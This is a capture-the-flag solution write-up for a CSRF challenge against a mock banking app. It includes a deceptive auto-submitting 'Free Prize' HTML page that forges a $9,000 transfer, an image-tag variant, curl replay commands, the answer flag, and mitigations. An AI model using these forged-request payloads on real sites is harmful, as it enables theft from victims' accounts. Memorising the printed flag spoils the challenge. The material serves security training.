# Challenge 14: CSRFBank - Solution

## Vulnerability Type
**Cross-Site Request Forgery (CSRF)**

## Description
The application's transfer functionality lacks CSRF protection, allowing attackers to forge requests that transfer money from a victim's account.

## Vulnerable Code
```python
# VULNERABLE: No CSRF token, no Referer check, accepts cross-origin POST
@app.route("/transfer", methods=["POST"])
def transfer():
    if "user" not in session: return redirect("/")
    # ... processes transfer without CSRF validation
```

## Exploitation Steps

### Step 1: Understand the Goal
- You're logged in as `bob` with $500
- Alice has $10,000 and the flag
- You need $9,000+ to get the flag
- You need to trick Alice into transferring money to you

### Step 2: Create Malicious HTML Page
Create `csrf_attack.html`:
```html
<!DOCTYPE html>
<html>
<head><title>Free Prize!</title></head>
<body>
<h1>Congratulations! Click to claim your prize!</h1>
<form id="csrf" action="http://[TARGET_HOST]/transfer" method="POST">
  <input type="hidden" name="to" value="bob">
  <input type="hidden" name="amount" value="9000">
</form>
<script>
  // Auto-submit the form
  document.getElementById('csrf').submit();
</script>
</body>
</html>
```

### Step 3: Host the Malicious Page
Host this HTML file on a web server or use a service like:
- Python: `python -m http.server 8000`
- Or use online HTML hosting

### Step 4: Trick Alice to Visit
In a real scenario, you'd send Alice the link. For this CTF:
1. Login as Alice (use `/alice-visits` endpoint if available)
2. Or simulate: Open the malicious page while logged in as Alice
3. The form auto-submits
4. Money transfers from Alice to Bob

### Step 5: Get the Flag
1. Login as Bob
2. Check balance (should be $9,500)
3. The flag appears on the dashboard

## Alternative: Using Image Tag
```html
<img src="http://[TARGET_HOST]/transfer?to=bob&amount=9000" style="display:none">
```
(Only works if the endpoint accepts GET requests)

## Using curl to Simulate
```bash
# Login as Alice first to get session cookie
curl -c cookies.txt -d "username=alice&password=alice123" http://[host]/login

# Perform transfer (simulating CSRF)
curl -b cookies.txt -d "to=bob&amount=9000" http://[host]/transfer
```

## Flag
```
FCTF{csrf_n0_t0k3n_n0_s3cur1ty}
```

## How It Works
- CSRF exploits the browser's automatic cookie sending
- When Alice visits the malicious page, her browser sends her session cookie
- The server sees a valid session and processes the transfer
- Alice never intended to make the transfer

## Mitigation
- Implement CSRF tokens:
  ```python
  from flask_wtf.csrf import CSRFProtect
  csrf = CSRFProtect(app)
  ```
- Verify Referer/Origin headers
- Use SameSite cookie attribute:
  ```python
  app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
  ```
- Require re-authentication for sensitive operations
- Use custom headers (X-Requested-With)
- Implement double-submit cookie pattern
- Add CAPTCHA for critical operations
